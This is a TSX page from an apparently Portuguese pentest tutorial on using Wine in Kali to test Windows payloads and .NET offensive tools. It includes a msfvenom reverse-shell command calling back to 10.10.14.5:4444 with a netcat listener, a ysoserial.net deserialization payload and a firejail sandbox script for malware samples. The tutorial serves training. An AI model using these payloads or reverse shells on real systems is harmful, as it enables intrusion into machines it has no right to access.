import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Wine() {
  return (
    <PageContainer
      title="Wine — Rodando Binários Windows no Kali"
      subtitle="Wine, winetricks e prefixes: testar payloads .exe, ferramentas .NET e validar implants sem precisar de uma VM Windows."
      difficulty="intermediario"
      timeToRead="14 min"
    >
      <h2>Por que Wine importa para pentest</h2>
      <p>
        Você gerou um <code>payload.exe</code> com <code>msfvenom</code>, compilou um
        loader em C# ou tem um binário <code>SharpHound.exe</code> pra rodar. Antes de
        soltar no alvo real você quer um <strong>smoke test</strong>: o binário roda? Erra
        em qual dependência? Faz callback de fato? Wine te dá esse teste em segundos, sem
        spinar VM Windows.
      </p>
      <p>
        <strong>Aviso técnico:</strong> Wine NÃO é sandbox e NÃO é Windows real. Coisas que
        usam syscalls específicas, NTDLL undocumented, drivers, ou que detectam Wine via
        flags como <code>HKCU\\Software\\Wine</code> NÃO vão funcionar igual. Use Wine para
        <em>conferir sintaxe e callback básico</em>, não para validar evasão de EDR.
      </p>

      <h2>Instalação no Kali</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Kali é amd64; habilitar i386 para rodar PE de 32-bit",
            cmd: "sudo dpkg --add-architecture i386",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo apt update && sudo apt install -y wine wine32:i386 wine64 winetricks",
            out: `Reading package lists... Done
Setting up wine32:i386 (8.0.2~repack-1) ...
Setting up wine64 (8.0.2~repack-1) ...
Setting up wine (8.0.2~repack-1) ...
Setting up winetricks (20240105-1) ...`,
            outType: "info",
          },
          {
            cmd: "wine --version",
            out: "wine-8.0.2 (Debian 8.0.2~repack-1)",
            outType: "success",
          },
          {
            comment: "primeira execução cria ~/.wine/ e baixa Mono+Gecko",
            cmd: "wine cmd /c ver",
            out: `wine: created the configuration directory '/home/wallyson/.wine'
wine: configuration in L"\\\\?\\\\C:\\\\users\\\\wallyson\\\\AppData\\\\Local\\\\wine" has been updated.

Microsoft Windows 10.0.19045 (10.0.19045)`,
            outType: "success",
          },
        ]}
      />

      <h2>Anatomia de um WINEPREFIX</h2>
      <p>
        Cada <strong>prefix</strong> é uma instalação Windows isolada (um <code>C:</code>
        inteiro). Por padrão é <code>~/.wine</code>, mas você deve criar prefixes
        diferentes por uso: um pra payloads, um pra ferramentas .NET, um descartável
        para malware sample.
      </p>

      <CodeBlock
        language="bash"
        title="estrutura de um prefix"
        code={`~/.wine/
├── dosdevices/
│   ├── c:        -> ../drive_c       # mapeamento da letra C:
│   └── z:        -> /                # Z: aponta pra raiz do Linux (!)
├── drive_c/
│   ├── windows/
│   │   ├── system32/
│   │   └── syswow64/
│   ├── Program Files/
│   ├── Program Files (x86)/
│   └── users/wallyson/
├── system.reg     # HKLM
├── user.reg       # HKCU
└── userdef.reg    # HKEY_USERS\\.Default

# Z: é uma backdoor: dentro do "Windows", \\\\Z\\\\etc\\\\passwd lê /etc/passwd do Kali`}
      />

      <CommandTable
        title="trabalhando com prefixes"
        variations={[
          { cmd: "WINEPREFIX=~/.wine-payloads wineboot", desc: "Cria/inicializa prefix novo.", output: "Cria toda a estrutura em ~/.wine-payloads/" },
          { cmd: "WINEPREFIX=~/.wine-payloads WINEARCH=win32 wineboot", desc: "Prefix puro 32-bit (raro hoje, útil pra binário antigo).", output: "Não suporta x64." },
          { cmd: "WINEPREFIX=~/.wine-net winecfg", desc: "GUI de configuração (libs, drives, audio).", output: "Abre janela do winecfg." },
          { cmd: "rm -rf ~/.wine-malware", desc: "Destrói o prefix (sandbox descartável).", output: "Use sempre depois de testar amostra suspeita." },
          { cmd: "WINEDEBUG=-all wine app.exe", desc: "Suprime logs do Wine (-all).", output: "Limpa o stderr poluído." },
          { cmd: "WINEDEBUG=+relay,+seh wine app.exe 2> wine.log", desc: "DEBUG completo (chamadas API + exceptions).", output: "Útil para entender por que o binário trava." },
          { cmd: "wine regedit", desc: "Editor de registry da prefix.", output: "Equivalente ao regedit.exe." },
          { cmd: "wineserver -k", desc: "Mata todos os processos Wine atuais.", output: "Reset de processos travados." },
        ]}
      />

      <h2>winetricks — instalar deps Windows</h2>
      <p>
        Muito EXE pede .NET, VC++ runtime, fontes, etc. <code>winetricks</code> baixa e
        instala isso direto no prefix.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "winetricks list-installed",
            out: "(vazio para prefix novo)",
            outType: "muted",
          },
          {
            comment: "instalar VC++ 2019 redistributable e .NET 4.8 no prefix corrente",
            cmd: "WINEPREFIX=~/.wine-net winetricks -q vcrun2019 dotnet48",
            out: `Executing w_do_call vcrun2019
Executing load_vcrun2019
Downloading https://aka.ms/vs/17/release/vc_redist.x64.exe
[...]
Executing w_do_call dotnet48
Downloading dotnet48...
[...]
dotnet48: Microsoft .NET 4.8 installed`,
            outType: "info",
          },
          {
            cmd: "WINEPREFIX=~/.wine-net winetricks -q corefonts",
            out: "(instala Arial, Times, Verdana — necessário em apps com GUI)",
            outType: "muted",
          },
        ]}
      />

      <h2>Testando um payload .exe</h2>
      <Terminal
        path="~/payloads"
        lines={[
          {
            comment: "gera reverse shell windows/x64 → 10.10.14.5:4444",
            cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o stage1.exe",
            out: `[-] No platform was selected, choosing Msf::Module::Platform::Windows
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: stage1.exe`,
            outType: "info",
          },
          {
            cmd: "file stage1.exe",
            out: "stage1.exe: PE32+ executable (console) x86-64, for MS Windows",
            outType: "default",
          },
          {
            comment: "TERMINAL 1: listener",
            cmd: "nc -lvnp 4444",
            out: "Listening on 0.0.0.0 4444",
            outType: "muted",
          },
          {
            comment: "TERMINAL 2: roda o payload sob Wine (smoke test local)",
            cmd: "WINEPREFIX=~/.wine-payloads wine stage1.exe",
            out: `(payload executa silenciosamente; aguarda no listener)`,
            outType: "warning",
          },
          {
            comment: "TERMINAL 1 (depois): callback chega",
            cmd: "# (de volta no listener)",
            out: `Connection received on 127.0.0.1 51224
Microsoft Windows [Version 10.0.19045]
(c) Microsoft Corporation. All rights reserved.

Z:\\home\\wallyson\\payloads> whoami
wine\\wallyson`,
            outType: "success",
          },
        ]}
      />

      <AlertBox type="warning" title="Z:\\ é o Linux! Não confunda os mundos">
        <p>
          Note no exemplo acima: <code>Z:\\home\\wallyson\\payloads</code>. Isso é
          literalmente <code>/home/wallyson/payloads</code> do Kali. Se você pedir o shell
          pra apagar <code>C:\\Windows</code> ele apaga só do prefix; mas se pedir pra
          apagar <code>Z:\\etc</code> ele tenta apagar <code>/etc</code> do seu Kali (sem
          permissão, ufa). <strong>Cuidado com payloads que enumeram drives</strong>.
        </p>
      </AlertBox>

      <h2>Ferramentas pentest .NET sob Wine</h2>
      <Terminal
        path="~/tools"
        lines={[
          {
            cmd: "WINEPREFIX=~/.wine-net wine SharpHound.exe -h",
            out: `SharpHound v2.5.7

  -c, --collectionmethods         Comma separated list of collection methods to perform.
  --domain                        Search a specific domain.
  --searchforest                  Search all available domains.
  -o, --outputdirectory           Folder to output files to.
  -z, --zipfilename               Name for the final zip file.
  -d, --domain                    Search a specific domain.
[...]`,
            outType: "info",
          },
          {
            comment: "Rubeus offline — ver flags sem precisar de DC ainda",
            cmd: "WINEPREFIX=~/.wine-net wine Rubeus.exe",
            out: `   ______        _
  (_____ \\      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \\| ___ | | | |/___)
  | |  \\ \\| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

   Statistics                              |  Description
   --------------------------------------------------------------------------
   asktgt                                   |  Request a TGT for the specified user
   asktgs                                   |  Request a TGS using the specified TGT
   kerberoast                               |  Perform Kerberoasting against domain users
[...]`,
            outType: "success",
          },
          {
            comment: "ysoserial.net — gerar payload de deserialization",
            cmd: "WINEPREFIX=~/.wine-net wine ysoserial.exe -f Json.Net -g ObjectDataProvider -c \"calc.exe\"",
            out: `{
  "$type":"System.Windows.Data.ObjectDataProvider, ...",
  "MethodName":"Start",
  "ObjectInstance":{
    "$type":"System.Diagnostics.Process, System",
    "StartInfo":{ "FileName":"cmd", "Arguments":"/c calc.exe" }
  }
}`,
            outType: "success",
          },
        ]}
      />

      <h2>Sandbox descartável para amostra</h2>
      <p>
        Para abrir uma amostra de malware desconhecida, NUNCA use seu prefix principal.
        Crie um descartável, snapshote em LVM/Btrfs se possível, e tenha uma escotilha de
        emergência: <code>firejail</code>.
      </p>

      <CodeBlock
        language="bash"
        title="~/run-sample.sh — wrapper de sandbox"
        code={`#!/usr/bin/env bash
set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "uso: $0 <arquivo.exe>"
  exit 1
fi

SAMPLE="$(realpath "$1")"
PREFIX="$(mktemp -d -t wine-sandbox-XXXXXX)"

echo "[+] Prefix descartável: $PREFIX"
WINEPREFIX="$PREFIX" wineboot -i 2>/dev/null

echo "[+] Capturando rede com tcpdump (background)"
sudo tcpdump -i any -w "$PREFIX/cap.pcap" -nn 'not port 22' &
TCPDUMP_PID=$!

# firejail: bloqueia rede pra fora, sem disco extra, sem X (a menos que necessário)
echo "[+] Rodando $SAMPLE em firejail+wine sem rede"
firejail \\
  --noprofile \\
  --net=none \\
  --private-tmp \\
  --read-only=/etc \\
  --read-only=/home \\
  --whitelist="$PREFIX" \\
  --whitelist="$(dirname "$SAMPLE")" \\
  -- env WINEPREFIX="$PREFIX" wine "$SAMPLE" || true

echo "[+] Encerrando captura"
sudo kill "$TCPDUMP_PID" || true
echo "[+] PCAP salvo em $PREFIX/cap.pcap"
echo "[+] Para destruir prefix: rm -rf $PREFIX"`}
      />

      <h2>Limitações conhecidas</h2>
      <CommandTable
        title="o que NÃO funciona bem em Wine"
        variations={[
          { cmd: "Drivers / .sys", desc: "Wine não roda kernel drivers. Rootkits, hooks de NDIS, EDR drivers — tudo morre.", output: "Use VM Windows real." },
          { cmd: "AMSI / ETW interno", desc: "AMSI não existe em Wine. Bom: payload que falharia por AMSI vai parecer rodar. Ruim: você não testa evasão real.", output: "Validar evasão SÓ em Windows." },
          { cmd: "WMI complexo", desc: "Funciona parcialmente. Implementação incompleta.", output: "WMIC básico ok, query complexas falham." },
          { cmd: "PowerShell .NET 4.x", desc: "Funciona em prefix com dotnet48 instalado. Mas detection de execution policy é diferente.", output: "Use só pra sintaxe, não pra evasão." },
          { cmd: "DPAPI / SChannel TLS moderno", desc: "Implementação não 100% — alguns C2 com TLS 1.3 falham.", output: "Sliver/Cobalt mTLS pode dar errado." },
          { cmd: "Detect anti-Wine", desc: "Malware sério checa wine_get_version(), HKCU\\Software\\Wine, Z:\\, fontes Wine.", output: "Sample evasivo se recusa a rodar." },
        ]}
      />

      <PracticeBox
        title="Smoke test de payload msfvenom no Kali"
        goal="Validar end-to-end que um exe gerado por msfvenom dá callback, sem subir VM Windows."
        steps={[
          "Crie prefix dedicado ~/.wine-payloads.",
          "Gere reverse_tcp x64 com msfvenom apontando pra 127.0.0.1:4444.",
          "Suba listener netcat em outro terminal.",
          "Execute o exe sob WINEPREFIX e espere o callback.",
          "Mate o listener; destrua o prefix se quiser zerar.",
        ]}
        command={`# terminal 1: prefix + payload + listener
WINEPREFIX=~/.wine-payloads wineboot 2>/dev/null
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o /tmp/test.exe
nc -lvnp 4444 &
sleep 1

# rodar payload
WINEDEBUG=-all WINEPREFIX=~/.wine-payloads wine /tmp/test.exe &
sleep 3

# checar conexão
ss -tnp | grep :4444`}
        expected={`Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 51224
ESTAB    0   0   127.0.0.1:4444    127.0.0.1:51224  users:(("nc",pid=...))
ESTAB    0   0   127.0.0.1:51224   127.0.0.1:4444   users:(("wine64-preloader",pid=...))`}
        verify="Você vê duas conexões ESTAB (cliente e servidor) e o nc imprime o banner do cmd.exe (Microsoft Windows [Version ...])."
      />

      <AlertBox type="info" title="Quando subir VM Windows mesmo">
        <p>
          Wine é ótimo pra <strong>iterar rápido</strong> em payloads de POC e ferramentas
          .NET / .EXE de pentest. Mas para validar evasão de Defender/EDR, testar carga de
          driver, debugar com x64dbg/WinDbg ou usar Cobalt/Sliver com tudo de profile, suba
          uma VM Windows 10/11 (KVM ou VirtualBox) com snapshot. Combinado: Wine no dia-a-dia,
          VM antes de soltar em alvo real.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
